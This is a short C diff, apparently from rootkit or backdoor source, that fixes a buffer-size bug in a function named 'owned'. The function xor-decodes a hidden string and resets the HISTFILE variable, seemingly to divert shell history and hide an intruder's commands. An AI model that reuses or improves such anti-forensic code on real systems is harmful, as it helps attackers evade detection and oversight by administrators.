@@ -32,7 +32,7 @@ int owned(void)
 
         char _histfile[256], *histfile = strdup(HISTFILE); xor(histfile);
         unsetenv("HISTFILE");
-        snprintf(_histfile, sizeof(histfile), "HISTFILE=%s", histfile);
+        snprintf(_histfile, sizeof(_histfile), "HISTFILE=%s", histfile);
         putenv(_histfile);
         CLEAN(histfile);
 
